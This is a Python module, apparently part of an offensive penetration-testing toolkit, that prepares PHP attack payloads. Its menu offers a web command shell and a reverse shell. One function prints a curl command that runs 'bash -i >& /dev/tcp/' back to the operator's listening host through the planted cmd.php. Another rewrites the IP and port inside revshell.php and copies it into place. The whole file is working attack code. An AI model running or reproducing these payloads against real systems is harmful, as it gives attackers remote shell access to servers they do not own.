import os, re

class php_pl:
    def __init__(self, args, pl_path):
        self.args = args
        self.pl_path = pl_path

    def menu(self):
        print("\n--- PHP Payload ---")
        print("1. WEB CMD  [cmd.php]")
        print("2. RevShell [revshell.php]")
        choice = input(": ")
        if choice == "1":
            self.cmd()
        elif choice == "2":
            self.revshell()

    def cmd(self):
        os.system(f'cp {self.pl_path}cmd.php .')
        print(f"curl -s -G http://?/cmd.php --data-urlencode \"cmd=bash -c 'bash -i >& /dev/tcp/{self.args.lhost}/{self.args.lport} 0>&1'\"")

    def revshell(self):
        with open(f'{self.pl_path}revshell.php', 'r') as file:
            content = file.read()
        content = re.sub(r"\$ip\s*=\s*'[^']*';", f"$ip = '{self.args.lhost}';", content)
        content = re.sub(r"\$port\s*=\s*\d*;", f"$port = {self.args.lport};", content)
        with open(f'{self.pl_path}revshell.php', 'w') as file:
            file.write(content)
        os.system(f'cp {self.pl_path}revshell.php .')